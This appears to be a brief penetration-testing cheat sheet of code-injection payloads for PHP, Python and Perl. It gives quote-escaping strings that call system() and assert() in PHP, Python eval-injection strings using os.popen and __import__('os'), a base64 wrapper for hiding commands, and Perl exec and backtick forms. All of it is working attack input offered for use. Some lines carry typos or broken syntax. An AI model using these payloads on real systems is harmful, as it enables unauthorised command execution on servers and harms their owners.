For contactination use period (.) for PHP/Pearl and plus (+) for Python.

PHP:
```PHP
".system('uname -a');#

);}system(%27whoami%27);//

'.system(ls).'
# Comes from assertion ex.   assert() 
# May not work on PHP 7 and 8
# ex URL string:   /?name=hacker'.system(ls).'
```

Python:

Test python execution, may have to URL encode the + signes at %2b:
```Python
“+str(1+1)+”
```
```Python
“str(os.popen('whoami').read())”
```

If os library isnt imported, you can run:
```Python
__import__('os').system('id')

__import_('os').popen('uname').read())
```


b64 encode First the decoded string:
```Python
__import__('base64').b64decode('PAYLOAD ENCODED')
```
Followed by the full payload:
```Python
str(os.popen(__import__('base64').b64decode('PAYLOAD ENCODED')).read())

str(__import__('os').popen(__import__('base64').b64decode('PAYLOAD ENCODED')).read())
```


#### PERL

Execution Commands:
```PERL
system('uname')

exec('uname')

(`uname`)
```
